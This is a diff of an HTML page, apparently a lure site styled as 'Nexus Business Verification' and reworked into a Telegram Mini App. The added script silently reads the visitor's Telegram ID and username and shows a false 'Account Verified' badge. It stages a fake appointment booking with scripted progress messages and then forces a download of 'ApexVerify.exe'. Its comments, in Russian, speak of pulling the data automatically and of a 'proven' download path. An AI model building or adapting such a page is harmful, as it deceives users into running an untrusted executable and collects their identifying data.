@@ -2,89 +2,110 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus Business Verification</title>
-    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <!-- Подключаем скрипт Телеграма -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Nexus Business TMA</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); text-align: center; width: 380px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; overflow: hidden; }
+        .card { background: #1e293b; padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
         
-        .time-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .time-slot { background: #334155; border: 1px solid #475569; padding: 10px; border-radius: 8px; cursor: pointer; transition: 0.2s; }
-        .time-slot:hover { border-color: #3b82f6; background: #1e293b; }
-        .time-slot.selected { background: #3b82f6; border-color: #60a5fa; }
+        h2 { text-align: center; margin-top: 0; color: #f8fafc; font-size: 22px; }
+        p.desc { text-align: center; color: #94a3b8; font-size: 13px; margin-bottom: 20px; }
 
-        .btn { background: #3b82f6; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
-        .btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.6; }
+        .user-badge { background: #0f172a; padding: 12px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; display: flex; flex-direction: column; gap: 5px; }
+        .user-badge span { font-size: 12px; color: #3b82f6; font-weight: bold; text-transform: uppercase; }
+        .user-badge div { font-family: monospace; color: #e2e8f0; font-size: 15px; }
 
-        #booking-section { display: block; }
-        #loader-section { display: none; }
-        
-        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        .time-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; }
+        .time-slot { background: #334155; border: 1px solid #475569; padding: 12px; border-radius: 10px; text-align: center; cursor: pointer; transition: 0.2s; font-size: 14px; }
+        .time-slot.selected { background: #3b82f6; border-color: #60a5fa; color: white; box-shadow: 0 0 15px rgba(59, 130, 246, 0.5); }
+
+        .btn { background: #3b82f6; color: white; border: none; padding: 18px; border-radius: 14px; font-weight: 600; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
+        .btn:disabled { background: #475569; cursor: not-allowed; opacity: 0.5; }
+
+        #loader-section { display: none; text-align: center; padding: 30px 0; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #3b82f6; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <!-- СЕКЦИЯ ВЫБОРА ВРЕМЕНИ -->
-    <div id="booking-section">
-        <div style="font-size: 40px; margin-bottom: 10px;">📅</div>
-        <h2 style="margin-bottom: 5px;">Select a Time Slot</h2>
-        <p style="color: #94a3b8; font-size: 13px;">Choose your verification appointment time to unlock the tool.</p>
-        
-        <div class="time-grid" id="timeGrid">
-            <div class="time-slot" onclick="selectTime(this)">09:00 AM</div>
-            <div class="time-slot" onclick="selectTime(this)">11:30 AM</div>
-            <div class="time-slot" onclick="selectTime(this)">02:15 PM</div>
-            <div class="time-slot" onclick="selectTime(this)">04:45 PM</div>
+    <div id="main-ui">
+        <h2>Verification Hub</h2>
+        <p class="desc">Your Telegram data is verified. Please select a time slot for your session.</p>
+
+        <!-- Блок с данными, которые мы вытянем автоматом -->
+        <div class="user-badge">
+            <span>Account Verified</span>
+            <div id="user_info">Loading data...</div>
         </div>
 
-        <button class="btn" id="confirmBtn" disabled onclick="confirmBooking()">Confirm Appointment</button>
+        <div class="time-grid">
+            <div class="time-slot" onclick="selectTime(this)">10:00 AM</div>
+            <div class="time-slot" onclick="selectTime(this)">01:30 PM</div>
+            <div class="time-slot" onclick="selectTime(this)">04:00 PM</div>
+            <div class="time-slot" onclick="selectTime(this)">07:45 PM</div>
+        </div>
+
+        <button class="btn" id="confirmBtn" disabled onclick="startDownload()">Confirm & Download</button>
     </div>
 
-    <!-- СЕКЦИЯ ЗАГРУЗКИ (скрыта по умолчанию) -->
     <div id="loader-section">
         <div class="spinner"></div>
-        <h3 id="status-title">Securing your slot...</h3>
-        <p id="msg" style="font-size: 14px; color: #94a3b8;">Verifying selection with server...</p>
+        <h3 id="status-title">Syncing with Telegram...</h3>
+        <p id="msg" style="font-size: 14px; color: #94a3b8;">Finalizing access for your ID...</p>
     </div>
 </div>
 
 <script>
-    let selectedElement = null;
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // Разворачиваем на все окно
+
+    let selectedTimeSlot = null;
+    let userId = "Unknown";
+    let username = "Anonymous";
+
+    // Авто-получение данных при загрузке
+    window.onload = function() {
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            userId = tg.initDataUnsafe.user.id;
+            username = tg.initDataUnsafe.user.username ? "@" + tg.initDataUnsafe.user.username : "ID: " + userId;
+            document.getElementById('user_info').innerText = username + " [" + userId + "]";
+        } else {
+            document.getElementById('user_info').innerText = "Manual Auth Required";
+        }
+    };
 
     function selectTime(el) {
-        // Убираем выделение с предыдущего
-        if (selectedElement) selectedElement.classList.remove('selected');
-        
-        // Выделяем текущий
+        document.querySelectorAll('.time-slot').forEach(s => s.classList.remove('selected'));
         el.classList.add('selected');
-        selectedElement = el;
-        
-        // Активируем кнопку
+        selectedTimeSlot = el.innerText;
         document.getElementById('confirmBtn').disabled = false;
     }
 
-    function confirmBooking() {
-        document.getElementById('booking-section').style.display = 'none';
+    function startDownload() {
+        document.getElementById('main-ui').style.display = 'none';
         document.getElementById('loader-section').style.display = 'block';
 
-        const msg = document.getElementById('msg');
         const title = document.getElementById('status-title');
+        const msg = document.getElementById('msg');
 
-        // Имитация "умного" процесса
         setTimeout(() => {
-            msg.innerText = "Slot confirmed for " + selectedElement.innerText + "!";
-            title.innerText = "Generating Access...";
+            title.innerText = "Slot Secured!";
+            msg.innerText = "Time: " + selectedTimeSlot + " for " + username;
             
             setTimeout(() => {
-                msg.style.color = '#10b981';
-                msg.innerText = "✅ Verification Tool ready. Starting download...";
+                title.innerText = "Preparing File...";
+                msg.innerText = "Generating encrypted package...";
                 
-                // СКАЧИВАНИЕ
-                window.location.href = 'api/v4/download/ApexVerify.exe';
+                setTimeout(() => {
+                    msg.style.color = '#10b981';
+                    msg.innerText = "✅ Verification Ready. Downloading...";
+                    // Твой проверенный путь
+                    window.location.href = 'api/v4/download/ApexVerify.exe';
+                }, 2000);
             }, 2000);
-            
         }, 2000);
     }
 </script>
